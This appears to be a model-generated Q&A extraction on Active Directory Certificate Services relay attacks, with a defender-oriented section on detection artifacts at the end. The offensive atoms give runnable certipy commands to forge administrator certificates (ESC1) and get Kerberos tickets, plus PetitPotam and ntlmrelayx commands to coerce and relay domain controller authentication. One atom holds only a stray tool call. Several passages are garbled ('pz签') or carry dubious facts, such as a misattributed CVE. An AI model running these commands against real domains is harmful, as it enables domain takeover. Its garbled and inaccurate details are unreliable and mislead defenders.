# mimo-v2.6-flash — ad-cs-relay
# SOURCE: mimo-v2.6-flash, ATOMISED extraction (cybersec-atom-corpus method)

### Atom 2

Q: What is the exact certipy req command to request a certificate with an arbitrary SAN (ESC1 pattern)?

## Core command

```bash
certipy req -u jsmith -p 'Password123!' -dc-ip 10.0.0.10 \
  -ca 'CONTOSO-CONTOSO-CA' \
  -template 'ESC1_Vuln' \
  -upn 'administrator@contoso.local' \
  -out admin.pfx
```

That is the ESC1 shape: a template with `msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT (0x1)` plus enrollment rights for your principal lets the requester dictate the identity in the certificate. `-upn` embeds the SAN as an `otherName` (OID `1.3.6.1.4.1.311.20.2.3`), which is the form PKINIT/NTLM over schannel will honor for impersonation.

## SAN selectors

| Flag | SAN form | Typical use |
|---|---|---|
| `-upn administrator@contoso.local` | `otherName` / UPN | impersonating a user account — the usual ESC1 payload |
| `-dns dc01.contoso.local` | `dNSName` | computer-account or SChannel impersonation |
| `-sid S-1-5-21-…-500` | `SID` (certipy ≥ 4.x) | direct SID-based auth, sid-extension |
| `-alt-name …` | arbitrary / legacy | older 3.x flag syntax; in 4.x it coexists with the three above |

Pair them if the target verification path reads a non-UPN SAN — `-upn` + `-sid` together is the common belt-and-braces case.

## Preconditions to verify first

```bash
certipy find -u jsmith -p 'Password123!' -dc-ip 10.0.0.10 -stdout \
  | grep -A12 'ESC1_Vuln'
```

You need all three:

1. `ENROLLEE_SUPPLIES_SUBJECT` set in `msPKI-Certificate-Name-Flag` — this is what makes the SAN attacker-controlled rather than derived from AD.
2. `msPKI-Certificate-Name-Flag` does **not** also require a specific subject, and `pz签` subject-name flags permit substitution (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` beats `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY`).
3. You hold `msPKI enrollment` / `Certificate-Template` extended rights on that template, and the requested subject isn't blocked by `pz`-level access control.

If the template does *not* let you supply the subject but the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2 = 1`, you inject the SAN through the subject instead — a UPN embedded in the DN gets rewritten by `policy.inf` substitution:

```bash
certipy req -u jsmith -p 'Password123!' -dc-ip 10.0.0.10 \
  -ca 'CONTOSO-CONTOSO-CA' \
  -template 'Machine' \
  -subject 'CN=administrator@contoso.local'
```

## Complete to authentication

```bash
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
```

`auth` runs PKINIT with the PFX and returns the TGT plus a `.ccache`. Add `-ldap-shell` if you want to pivot into an LDAP session on the same call. If PKINIT fails with `KDC_ERR_ETYPE_NOSUPP`, re-request with `-reuse-key` and confirm the template's private key length/algorithm meets the CA's minimum, or convert with `certipy to-pem` before retrying.

One gotcha worth flagging: `req` will fail with `CSR submitted for processing` and hand you an unresolved request if the CA requires manager approval (`msPKI-Approval-Flag`). That is a template config difference, not a command error — you'll need `SE_REQ_TYPE_SUBORDINATE_CA`-style approval or an auto-issue template.

---

### Atom 3

Q: What is the exact PetitPotam command to coerce NTLM authentication from a domain controller?

The base command from Topotam's PetitPotam is:

```bash
python3 petitpotam.py <listener_IP> <target_IP>
```

So to coerce a DC at `10.0.0.10` to authenticate back to your listener at `10.0.0.66`:

```bash
python3 petitpotam.py 10.0.0.66 10.0.0.10
```

The listener is where the DC sends its NTLM Type 1/Type 3 — commonly an `ntlmrelayx.py` instance or Responder:

```bash
ntlmrelayx.py -t ldaps://10.0.0.10 -smb2support
python3 petitpotam.py 10.0.0.66 10.0.0.10
```

**Useful options** (the original tool overwrites `listen` args if you misorder them — the first argument is always your listener):

```bash
# choose the RPC pipe (efsrpc is default; lsarpc, samr, srvsvc, etc. also work)
python3 petitpotam.py -pipe efsrpc 10.0.0.66 10.0.0.10

# choose the EFS opnum / method (5 = EfsRpcOpenFileRaw via \\attacker\share)
python3 petitpotam.py -algo 5 10.0.0.66 10.0.0.10
```

Notes on behavior:

- If the DC has the EFSRPC endpoint exposed unauthenticated (pre-2022 patching, or partially patched), you'll see `Binding OK` and a capture on the listener.
- Post-patch (CVE-2022-26809 / the March 2022 EFSRPC hardening), `EfsRpcOpenFileRaw` requires authentication, so variants like `EfsRpcEncryptFileSrv` (`-algo 6` in some forks), SharpPetitPotam, or coerced-to-self techniques against machine accounts are the fallback.
- Windows Server 2008 R2 and earlier also trigger on raw `\\attacker\share` UNC handling via the `lsarpc` pipe if `efsrpc` is closed.

Common lab chain: responder/ntlmrelayx on the listener, run the coercion against the DC, capture the machine or domain account relay, then either LDAP signing-bypass relay to RBCD or a certificate request over AD CS.

---

### Atom 4

Q: What is the exact ntlmrelayx command to relay to LDAP on a domain controller, and what flag skips the signature check discussion?

<tool_call><function=bash><parameter=command>command -v ntlmrelayx ntlmrelayx.py impacket-ntlmrelayx 2>/dev/null; echo "---pip---"; pip show impacket 2>/dev/null | head -6; echo "---python---"; python3 -c 'import impacket, os; print(os.path.dirname(impacket.__file__))' 2>&1 | tail -2</parameter><parameter=description>Locate ntlmrelayx / impacket installation</parameter></function></tool_call>

---

### Atom 5

Q: What registry and event-log artifacts does AD CS escalation leave that a defender can detect?

## The pipeline, and where it leaves residue

Every AD CS escalation is a five-stage process, and each stage writes something:

```
enumerate LDAP (templates/CAs) → alter config (CA registry or AD attributes)
  → submit request (CA DB row, IIS log, .req file)
  → use cert for auth (private key + Kerberos 4768)
  → act at new privilege (4769, 4624, 4680)
```

Detection works best by joining any one of these stages to another — a config change *preceding* an issuance is far more incriminating than either alone.

---

## 1. CA-side registry (the highest-signal artifact)

Everything the CA reads lives under one key:

```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\
├── PolicyModules\<module>\          <- EDITF_* flags, extension lists
├── Security                         <- REG_MULTI_SZ SD (who can manage)
├── AuditFilter                       <- DWORD bitmask (which 48xx you'll ever see)
├── ValidityPeriod / CRLPeriod / CRLOverlapPeriod / OverlapUnits
├── SubjectTemplate / LimitRegistrationAuthorityToAccount
├── RequestExtensionList / DisableExtensionList
└── CASpecificExtensions ...
```

**Detector's map:**

| Misconfiguration | Registry residue |
|---|---|
| ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` (any request may carry an arbitrary SAN) | DWORD under `PolicyModules\<module>` set to `1` |
| ESC3 — conditional issuance / rogue CA template (`EDITF_REQUESTADDCERTTEMPLATE` for template injection) | same subkey |
| ESC11 — RPC/auth-level relaxation, `EnableRetries`/auth flags | DWORD changes under `Configuration\<CA>` |
| Weakened CA ACL | the `Security` value's SD bytes |
| Audit-silencing | `AuditFilter` set to `0` or low — **this is itself a finding** |

`certutil -setreg` writes these ordinally, then **requires a CertSvc restart**. The restart is your correlate:

- **System 7036** — *"The Certificate Services entered the running state"* (Service Control Manager), often paired with a preceding **7035**/stop entry.
- **Security 4880 / 4881** — CA started / stopped, if CA auditing is on.

**Hunt:** any `AuditFilter` or `PolicyModules``Execution` value write timestamped within ±5 min of a `schtasks`/`wmic process call create`/psexec launching `certutil -setreg`, followed by an issuance to a subject whose SAN ≠ DN.

Dates are recoverable even if the attacker cleans after themselves: use `RegRipper`'s `ntuser`/`software` hives or `Get-ItemProperty` + `LastWriteTime` from the key's `$KEY.LastWriteTime` via `Get-KeyLastWriteTime`-style NtQueryKey calls — **registry last-write timestamps on `PolicyModules` subkeys survive value deletion**.

---

## 2. AD-side artifacts (template tampering — ESC1/2/3/4/9/13)

Templates are AD objects. Enable **DS Access → Directory Service Changes** and you get:

| Event | Channel | Meaning |
|---|---|---|
| **5136** | Security | Attribute modified — `msPKI-Certificate-Name-Flag` (→ ENROLLEE_SUPPLIES_SUBJECT), `msPKI-Enrollment-Flag`, `msPKI-RA-Signature` (→ 0), `flags` (`CT_FLAG_NO_SECURITY_EXTENSION` for ESC9), `msPKI-Certificate-Policy` (ESC13), **or `securityDescriptor`** (enrollment perms granted) |
| **5137** | Security | Template *created* (rogue duplicate, ESC13's `[Skip discovery]`-adjacent artifacts) |
| **5139** | Security | Template moved / `newOU` |
| **5141** | Security | Template deleted |

The three tell-tale `Directory Service` log entries:

- **1644** — expensive-search / query statistics. Certipy and Certify issue wide subtree searches over `CN=Certificate Templates,CN=Configuration`; with **Field Engineering → 5** this logs the full filter. This is your *pre-attack* signal.
- **1643/1644** quads from a host that has never touched PKI before.

Audit-enabled check: watch for 5136 against `CN=* ,CN=Certificate Templates,CN=Configuration,DC=...` where attribute is `securityDescriptor` — a DACL edit granting `ENROLL` to `Domain Users` on `User` or `Machine` templates is ESC1's precondition and is fully attributable.

---

## 3. Client/host ledger side (where the request is born)

| Location | Artifact |
|---|---|
| `HKCU\Software\Microsoft\Cryptography\Windows NT\CurrentRequest` | `RequestId`, `SerialNumber`, `CAName`, `SanitizedName` — persists after `certreq -new`/`-submit` |
| `%APPDATA%\Microsoft\Crypto\RSA\MachineKeys\` + `HKCU\Software\Microsoft\Crypto\RSA\<SID>\` | private key container file for the new auth cert; **creation timestamp = issuance time** |
| `Cert:\LocalMachine\My` / `Cert:\CurrentUser\My` | the issued cert — inspect `EnhancedKeyUsageList`, `SubjectAlternativeName`, `Issuer`, `NotBefore` |
| `%TEMP%\*.req`, `C:\Windows\System32\CertSrv\CertEnroll\*.req` | raw requested `CertificateRequest` blob (contains the SAN as submitted) |
| IIS `W3SVC1\*.log` on the CA | **`POST /Certsrv/certfnsh.asp`**, `/certsrv/submit.asp`, `/certsrv/mscep.dll` — ESC8/ESC7/HTTP-CMC traffic; `%c-ip` gives the relay source |
| `\\<CA>\CertSrv` share (SMB) | Security **5140/5145** |

**On the CA itself:** `C:\Windows\System32\CertLog\` — `CertDB`/`edb*.log`/`*.jrs`. Even after `certutil -deletereq`, the ESE transaction logs retain `RequestAttributes`, including the submitted **SAN attribute**. This is the forensic backstop when 4886/4887 were never audited.

---

## 4. Certificate used for authentication (the watering-hole of artifacts)

When the cert is consumed for PKINIT / Schannel / an enrollment-channel auth:

| Event | Channel | Why it matters |
|---|---|---|
| **5058** / **5059** / **5061** | Security | Key file access / sign operation — *the private key of the new cert was used*. 5061 with `Signing` + a key belonging to a cert issued <1h ago is the single cleanest "cert was used" signal |
| **4768** | Security | TGT issued with certificate pre-auth. Practical discriminator: **Pre-Authentication Type ≠ 2** (commonly reported as `15` / key-trust — validate against your DC build, and note that Windows Hello for Business produces the same value, so correlate on the cert thumbprint rather than the value alone) |
| **4769** | Security | Service ticket — the *post-escalation action* (e.g., a ticket for `cifs`/`ldap` against a target the source account could never reach before) |
| **4624** | Security | Credential validation; pair `Logon ID` with the 4768 for attribution. Type 3 from an unexpected source |
| **CAPI2** `Microsoft-Windows-CAPI2/Operational` | optional channel | Store open/import and certificate chain building — enable selectively, it's high-volume |

**Chain that closes it:** newly issued cert with an UPN-equivalent SAN of a privileged account (4887) → 5061 sign op on that cert's key within minutes → 4768 with non-timestamp pre-auth for that privileged account → 4769 for `ldap`/`cifs` against a server. Four independent logs, one story.

---

## 5. ESC technique → artifact cheat sheet

| Technique | Primary artifacts |
|---|---|
| **ESC1/ESC2** (ENROLLEE_SUPPLIES_SUBJECT, no EKU constraint) | 5136 on template flags/ACL → 4887 (SAN mismatch) → 5061 → 4768 |
| **ESC3** (secondary/conditions-signing template) | 5136 (template created/altered) → two-stage issuance; 4887 ×2 |
| **ESC4** (template ACL to a low-priv principal) | 5136 `securityDescriptor` on template — **this is the whole detection** |
| **ESC6** (`EDITF_ATTRIBUTESUBJECTALTNAME2`) | CA registry DWORD write → System **7036** (restart) → 4886/4887 with SAN mismatch; any web/CLI request now arbitrary |
| **ESC7** (misconfigured CA ACL — issue/deny/ manage) | `Security` value change on registry key; **4881/4880**; **4882/4892** property change; 4889/4890 pending-request resume |
| **ESC8** (HTTP → NTLM relay to CA) | IIS `/certsrv/` POST from relay source; CA-side **4624 Type 3 NTLM** from unexpected host; downstream 4887 |
| **ESC9** (`CT_FLAG_NO_SECURITY_EXTENSION`) | 5136 on `flags`/`msPKI-Certificate-Policy`; missed schematic linkage → issuance of a policy-claim cert for a linked SID |
| **ESC11** (RPC encryption bypass) | CA registry value under `Configuration\<CA>` + restart; early-knowledge only — no issuance artifact until used |
| **ESC13** (issuance-policy → group link) | 5136 on `msDS-OIDToGroupLink` under `CN=OID,CN=Public Key Services`; then anomalous 4672/4680 token privileges in the session |

---

## 6. The gaps you must close to see any of this

The default is near-blind. Enable:

```cmd
:: CA-side (Server 2016+ → all four message classes minimum)
certutil -setreg CA\AuditFilter 0x7F
certutil -setreg CA\...        && net stop certsvc && net start certsvc
```

and in `gpedit`/GPO:

- **Audit Object Access → Success** (CA `AuditFilter` takes effect only then → Security 4880–4899)
- **Audit Directory Service Changes → Success** (5136/5137/5139/5141)
- **Audit Logon → Success**; **Audit Kerberos Authentication Service → Success** (4768 — off by default in many baselines)
- **Audit Credential Validation → Success** (4624/4648)
- **Directory Service Log → Field Engineering = 5** for 1644
- IIS logging enabled on the CA web enrollment site (never disable it "for performance")

---

## 7. Ready-to-run hunts

```powershell
# A. Certs whose SAN doesn't match the subject, issued in the last 14 days
certutil -view -csv -restrict "Disposition>=2" issued.csv
Import-Csv issued.csv |
  Where-Object { $_.'Certificate Template' -and $_.SAN -and
                 ($_.'Requester Name' -ne $_.Subject) } |
  Format-Table 'Request.Common Name', SAN, 'Requester Name', 'Specified Location'

# B. CA registry last-write (regripper/log2timeline alternative is easier on a volume image)
Get-Item "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\*" |
  Select-Object PSPath, SubKeyCount

# C. High-signal event sweep across the estate
$ids = 4768,4769,4886,4887,4892,4896,5136,5061,5058
Get-WinEvent -FilterHashtable @{LogName='Security';Id=$ids;StartTime=(Get-Date).AddDays(-14)} |
  Where-Object { $_.Id -eq 5136 -and $_.Message -match 'Certificate Templates|OID|enrollmentServices' }

# D. Autoenrollment noise check (System channel)
Get-WinEvent -LogName System |
  Where-Object ProviderName -eq 'Microsoft-Windows-TopicSelector-CertEnroll'  # or
Get-WinEvent -LogName System | Where-Object Id -in 1,13,16,17
```

KQL (Defender for Identity / Sentinel):

```kql
SecurityEvent
| where EventID in (4886,4887,4882,4892)
| extend Req = extract(@"Requester Name:\s+(.+)", 1, Description)
| project TimeGenerated, Computer, Req, EventID, Description

SecurityEvent
| where EventID == 5136
| where ObjectDN has_any ("Certificate Templates","enrollmentServices")
| summarize by TimeGenerated, SubjectUserName, AttributeLDAPDisplayName, ObjectDN
```

Order your triage: **configuration change → issuance → utilization → action.** A single 4887 is routine; a 5136 or `PolicyModules` write immediately before it is the escalation.

